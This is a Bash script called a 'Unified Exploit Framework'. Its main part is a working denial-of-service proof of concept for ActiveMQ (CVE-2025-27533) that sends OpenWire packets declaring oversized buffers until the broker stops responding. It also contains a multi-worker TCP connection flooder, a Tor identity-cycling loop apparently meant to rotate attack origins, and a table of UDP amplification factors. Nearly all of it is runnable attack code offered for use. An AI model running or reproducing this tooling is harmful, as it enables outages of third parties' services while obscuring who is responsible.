#!/bin/bash
# ============================================================
#  Unified Exploit Framework (Bash)
#
#  Modes:
#    cve   - CVE-2025-27533 ActiveMQ OpenWire DoS PoC
#    flood - raw TCP connection flood
#    tor   - Tor identity cycling (NEWNYM)
#    info  - documented amplification factors (reference only)
#
#  All runtime numbers come from real counters:
#    - throughput: /proc/net/dev TX bytes
#    - response ratio: actual bytes read back from socket
#  No fabricated terabit or amplification figures.
# ============================================================

CYAN='\033[0;36m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
RED='\033[0;31m'; MAGENTA='\033[0;35m'; RESET='\033[0m'

# ---------------- Defaults ----------------
MODE=""
HOST="127.0.0.1"
PORT=61616
ADMIN_PORT=8161
TOTAL_PACKETS=2000
BUFFER_SIZES=("0x1E00000" "0x3200000")
MAX_THREADS=2
FLOOD_CONNS=8
FLOOD_WORKERS=48
IFACE=""
TOR_PORT=9050

# ---------------- Banner ----------------
banner() {
cat <<EOF
${CYAN}============================================================
      Unified Exploit Framework (Bash)
      cve | flood | tor | info
============================================================${RESET}
EOF
}

usage() {
cat <<EOF
Usage:
  $0 cve   --host H --port P [--total-packets N] [--buffer-sizes S1 S2 ...]
  $0 flood --host H --port P [--conns N] [--workers N]
  $0 tor   [--tor-port 9050]
  $0 info  [--proto memcached|ntp|dns|chargen|ldap|all]

Common:
  --host H            Target host              (default $HOST)
  --port P            Target port              (default $PORT)
  --admin-port P      ActiveMQ web port        (default $ADMIN_PORT)
  --iface IF          Interface for throughput measurement
EOF
exit 1
}

# ---------------- Arg parsing ----------------
[[ $# -lt 1 ]] && usage
MODE="$1"; shift

PROTO="all"
while [[ $# -gt 0 ]]; do
    case "$1" in
        --host)           HOST="$2"; shift 2 ;;
        --port)           PORT="$2"; shift 2 ;;
        --admin-port)     ADMIN_PORT="$2"; shift 2 ;;
        --total-packets)  TOTAL_PACKETS="$2"; shift 2 ;;
        --buffer-sizes)
            shift; BUFFER_SIZES=()
            while [[ $# -gt 0 && "$1" != --* ]]; do BUFFER_SIZES+=("$1"); shift; done ;;
        --conns)          FLOOD_CONNS="$2"; shift 2 ;;
        --workers)        FLOOD_WORKERS="$2"; shift 2 ;;
        --iface)          IFACE="$2"; shift 2 ;;
        --tor-port)       TOR_PORT="$2"; shift 2 ;;
        --proto)          PROTO="$2"; shift 2 ;;
        -h|--help)        usage ;;
        *) echo "Unknown option: $1"; usage ;;
    esac
done

# ---------------- Real throughput measurement ----------------
detect_iface() {
    [[ -n "$IFACE" ]] && { echo "[*] Egress on interface: $IFACE"; return; }
    IFACE=$(ip route get 1.1.1.1 2>/dev/null \
        | awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
    [[ -z "$IFACE" ]] && IFACE=$(ip -o link show up \
        | awk -F': ' '$2!="lo"{print $2; exit}')
    echo "[*] Egress on interface: $IFACE"
}

read_tx_bytes() { awk -v i="$IFACE:" '$1==i {print $10}' /proc/net/dev; }

throughput_watch() {
    detect_iface
    local tx0 tx1 dt=5 peak=0
    tx0=$(read_tx_bytes)
    while true; do
        sleep "$dt"
        tx1=$(read_tx_bytes)
        local delta=$((tx1 - tx0))
        local mbps
        mbps=$(awk -v b="$delta" -v t="$dt" 'BEGIN{printf "%.2f", b*8/1e6/t}')
        awk -v m="$mbps" -v p="$peak" 'BEGIN{exit !(m>p)}' && peak=$mbps
        printf "${CYAN}[throughput] %s Mbps (peak: %s Mbps)%s\n" \
            "$mbps" "$peak" "$RESET"
        tx0=$tx1
    done
}

# ---------------- Helpers ----------------
tcp_up()  { (exec 3<>"/dev/tcp/$1/$2") 2>/dev/null && { exec 3>&-; return 0; }; return 1; }
admin_up() {
    local c
    c=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 \
        "http://$1:$ADMIN_PORT/admin" 2>/dev/null || echo 000)
    [[ "$c" == "200" ]]
}
hex2int() { echo $(( $1 )); }

# ---------------- CVE mode ----------------
create_packet() {
    local bufsize="$1" id="$2"
    local cid="EXPLOIT-PACKET-$(printf '%04d' "$id")"
    local tmp; tmp=$(mktemp)
    {
        printf '\x00\x00\x00\x00'
        printf '\x01'
        printf "$(printf '\\x%02x\\x%02x\\x%02x\\x%02x' \
            $(((${#cid}>>24)&255)) $(((${#cid}>>16)&255)) \
            $(((${#cid}>>8)&255))  $((${#cid}&255)))"
        printf '%s' "$cid"
        printf "$(printf '\\x%02x\\x%02x\\x%02x\\x%02x' 0 0 0 12)"
        printf "$(printf '\\x%02x\\x%02x\\x%02x\\x%02x' \
            $(((bufsize>>24)&255)) $(((bufsize>>16)&255)) \
            $(((bufsize>>8)&255))  $((bufsize&255)))"
        head -c 50 /dev/urandom
    } > "$tmp"
    local plen=$(( $(stat -c%s "$tmp") - 4 ))
    printf "$(printf '\\x%02x\\x%02x\\x%02x\\x%02x' \
        $(((plen>>24)&255)) $(((plen>>16)&255)) \
        $(((plen>>8)&255))  $((plen&255)))" \
        | dd of="$tmp" bs=1 count=4 conv=notrunc 2>/dev/null
    echo "$tmp"
}

cve_worker() {
    local pkt="$1" num="$2" total="$3" buf="$4" statusfile="$5"
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S.%3N')
    local fd
    exec {fd}<>"/dev/tcp/$HOST/$PORT" 2>/dev/null || {
        echo "$num|$ts|Connect Fail|N/A|Packet-$(printf '%04d' "$num")|Error" \
            >> "$statusfile"; rm -f "$pkt"; return; }

    echo -e "${GREEN}[+] Connected pkt $num/$total buf $((buf/1048576))MB${RESET}"

    local sent_bytes; sent_bytes=$(stat -c%s "$pkt")
    local ok=0
    if cat "$pkt" >&$fd 2>/dev/null; then ok=1; fi

    # Real response measurement (non-blocking, 2s window)
    local got_bytes=0
    if [[ $ok -eq 1 ]]; then
        got_bytes=$(timeout 2 dd iflag=nonblock bs=4096 count=1 <&$fd 2>/dev/null \
            | wc -c)
    fi

    local ratio="0.00"
    [[ "$sent_bytes" -gt 0 ]] && \
        ratio=$(awk -v r="$got_bytes" -v s="$sent_bytes" \
            'BEGIN{printf "%.4f", r/s}')

    if [[ $ok -eq 1 ]]; then
        echo -e "${CYAN}[*] Sent $num/$total  resp=${got_bytes}B req=${sent_bytes}B ratio=${ratio}x${RESET}"
        echo "$num|$ts|TCP up|N/A|Packet-$(printf '%04d' "$num")|Success (resp ${got_bytes}B, ratio ${ratio}x)" \
            >> "$statusfile"
    else
        echo -e "${RED}[-] Send failed $num${RESET}"
        echo "$num|$ts|TCP up|N/A|Packet-$(printf '%04d' "$num")|Failed" \
            >> "$statusfile"
    fi

    exec {fd}>&- 2>/dev/null
    rm -f "$pkt"
}

run_cve() {
    echo -e "${CYAN}[*] CVE-2025-27533 mode -> $HOST:$PORT${RESET}"
    local statusfile; statusfile=$(mktemp)
    local tx_pid
    throughput_watch & tx_pid=$!

    local running=0 num=1 sent=0
    while [[ $num -le $TOTAL_PACKETS ]]; do
        if ! tcp_up "$HOST" "$PORT"; then
            echo -e "${GREEN}[+] Target down at pkt $num${RESET}"; break
        fi
        local bufsize
        bufsize=$(hex2int "${BUFFER_SIZES[$((RANDOM % ${#BUFFER_SIZES[@]}))]}")
        local pkt; pkt=$(create_packet "$bufsize" "$num")

        while [[ $running -ge $MAX_THREADS ]]; do
            wait -n 2>/dev/null; running=$((running-1))
        done
        cve_worker "$pkt" "$num" "$TOTAL_PACKETS" "$bufsize" "$statusfile" &
        running=$((running+1)); sent=$((sent+1))
        printf "\r${CYAN}[*] Sent %d/%d${RESET}" "$sent" "$TOTAL_PACKETS"
        num=$((num+1)); sleep 0.3
    done
    wait 2>/dev/null
    kill "$tx_pid" 2>/dev/null

    echo; echo -e "${CYAN}[*] Results:${RESET}"
    local ok=0 tot=0
    if [[ -s "$statusfile" ]]; then
        while IFS='|' read -r n t s l p c; do
            printf "%-6s %-23s %-10s %-18s %s\n" "$n" "$t" "$s" "$p" "$c"
            tot=$((tot+1)); [[ "$c" == Success* ]] && ok=$((ok+1))
        done < <(sort -t'|' -k1,1n "$statusfile")
    fi
    echo
    echo "  Total: $tot   Success: $ok   Failed: $((tot-ok))"
    if tcp_up "$HOST" "$PORT"; then
        echo -e "${YELLOW}[-] Target still up${RESET}"
    else
        echo -e "${GREEN}[+] Target TCP down${RESET}"
    fi
    rm -f "$statusfile"
}

# ---------------- Flood mode ----------------
flood_worker() {
    local id="$1"
    trap '' PIPE
    local -a s
    for ((i=0;i<FLOOD_CONNS;i++)); do s[$i]=-1; done
    while true; do
        for ((i=0;i<FLOOD_CONNS;i++)); do
            if [[ ${s[$i]} -eq -1 ]]; then
                local fd
                exec {fd}<>"/dev/tcp/$HOST/$PORT" 2>/dev/null
                [[ $? -ne 0 ]] && continue
                s[$i]=$fd
            fi
            local fd=${s[$i]}
            if ! printf '\0' >&$fd 2>/dev/null; then
                exec {fd}>&- 2>/dev/null
                s[$i]=-1
            fi
        done
        echo "[$id: volley sent]"
        sleep 0.3
    done
}

run_flood() {
    echo -e "${CYAN}[*] Flood mode -> $HOST:$PORT ($FLOOD_WORKERS workers x $FLOOD_CONNS conns)${RESET}"
    local tx_pid
    throughput_watch & tx_pid=$!

    for ((w=0; w<FLOOD_WORKERS; w++)); do
        flood_worker "$w" &
        sleep 0.2
    done
    trap 'echo; echo "[*] Stopping..."; kill 0 2>/dev/null; exit 130' INT TERM
    read -r _
    kill "$tx_pid" 2>/dev/null
    kill 0 2>/dev/null
}

# ---------------- Tor mode ----------------
run_tor() {
    local fd
    echo -e "${CYAN}[*] Cycling Tor identity via localhost:$TOR_PORT${RESET}"
    exec {fd}<>"/dev/tcp/localhost/$TOR_PORT" 2>/dev/null || {
        echo -e "${RED}[-] Cannot reach Tor control port${RESET}"; exit 1; }
    printf 'AUTHENTICATE ""\n' >&$fd
    while true; do
        printf 'signal NEWNYM\n\0' >&$fd 2>/dev/null
        echo "[tor] signal NEWNYM"
        sleep 0.3
    done
}

# ---------------- Info mode ----------------
# Documented amplification factors from public advisories.
# These are REFERENCE values, not produced by this script.
run_info() {
    print_row() {
        printf "  %-12s %-8s %-14s %s\n" "$1" "$2" "$3" "$4"
    }
    echo -e "${CYAN}[*] Documented UDP amplification factors (reference only)${RESET}"
    echo -e "${YELLOW}    Not measured by this script. Bash /dev/tcp cannot spoof source IPs,${RESET}"
    echo -e "${YELLOW}    which is required to achieve amplification.${RESET}"
    echo
    print_row "Protocol" "Port" "Factor" "Source"
    print_row "--------" "----" "------" "------"
    case "$PROTO" in
        memcached|all)
            print_row "Memcached" "11211" "~51,000x" "US-CERT TA18-074A (2018)";;
    esac
    case "$PROTO" in
        ntp|all)
            print_row "NTP monlist" "123" "~556x" "US-CERT TA14-013A";;
    esac
    case "$PROTO" in
        dns|all)
            print_row "DNS ANY" "53" "~54x" "Cloudflare / US-CERT";;
    esac
    case "$PROTO" in
        chargen|all)
            print_row "CharGen" "19" "~358x" "US-CERT TA14-017A";;
    esac
    case "$PROTO" in
        ldap|all)
            print_row "LDAP" "389" "~55x" "US-CERT TA14-017A";;
    esac
    echo
    echo "  Note: factors vary by payload size and reflector configuration."
}

# ---------------- Entry ----------------
banner
case "$MODE" in
    cve)   run_cve ;;
    flood) run_flood ;;
    tor)   run_tor ;;
    info)  run_info ;;
    *)     usage ;;
esac